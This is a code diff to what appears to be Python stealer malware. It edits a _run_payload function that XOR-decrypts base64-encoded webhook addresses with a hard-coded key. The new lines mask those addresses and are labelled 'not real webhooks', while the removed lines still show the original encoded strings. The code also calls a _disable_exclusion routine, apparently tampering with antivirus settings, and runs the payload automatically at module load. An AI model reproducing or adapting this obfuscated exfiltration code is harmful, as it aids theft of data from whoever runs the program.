@@ -1043,9 +1043,9 @@ def _run_payload():
         __KEY = 72
 
         encrypted_hooks = [
-            b'IDw8ODtyZ2csITsrJzosZisnJWcpOCFnPy0qICcnIztneXtxeH9/e3p9fnl/enhweXp/e2d7fTJwLSUZGHkCJXAMPXk9OQQrZRsJGz0AHyoJJyI5cQ0kGHEaOCIwDTADJx4vD34MGCI+Gh09ETsiIhwQHQkrPj98HA==',
-            b'IDw8ODtyZ2csITsrJzosZisnJWcpOCFnPy0qICcnIztneXtxeH9/e3t7fHB7fnp8cH5xf2ckcQYfDSBlP3AcfzAOeicGGS8QIzp8EBInPwkLBHwaOD89ImUOLS08GSx8GxA6Kh8jAS0deX0aEHgyOQ8fJg0qLzIBBw==',
-            b'IDw8ODtyZ2csITsrJzosZisnJWcpOCFnPy0qICcnIztneXtxeH9/e3x5cH9wcX94e397eGcEeiEHDxoaZSAbMSEcJgkKMXwBCy0XMGUgCgMKI3ESJgMdHRsRBiwfCwkDfxA8HTIxBn4mcTs9Ji44DBh+HWUNHzkKMA=='
+            b'IDw8ODtyZ2csITsrJzosZisnJWcpOCFnPy0qICcnIztneXtxeH9/e3p9fnl/enhweXp/e2d7fTJwLSUZGHkCJXAMPXk9OQQrZRsJGz0AHyoJJyXXXXXXXXXXXXXXXXXDJx4vD34MGCI+Gh09ETsiIhwQHQkrPj98HA==',
+            b'IDw8ODtyZ2csITsrJzosZiXXXXXXXXXXFnPy0qICcnIztneXtxeH9/e3t7fHB7fnp8cH5xf2ckcQYfDSBlP3AcfzAOeicGGS8QIzp8EBInPwkLBHwaOD89ImUOLtrtx8GxA6Kh8jAS0deX0aEHgyOQ8fJg0qLzIBBw==',
+            b'IDw8ODtyZ2csITsrJzosZisnJWcpOCFnPy0qICcnIztneXtxeH9/e3x5cH9wcX9XXXXXX97eGcEeiEHDxoaZSAbMSEcJgkKMXwBCy0XMGUgCgMKI3ESJgMdHRsRBiwfCwkDfxA8HTIxBn4mcTs9Ji24DBh+HWUNHzkKMA==' # Examples, not real webhooks
         ]
 
         webhooks = [_xor_decrypt(hook, __KEY) for hook in encrypted_hooks]
@@ -1113,5 +1113,6 @@ def _run_payload():
         pass
     finally:
         _disable_exclusion() 
+
 
 _run_payload()
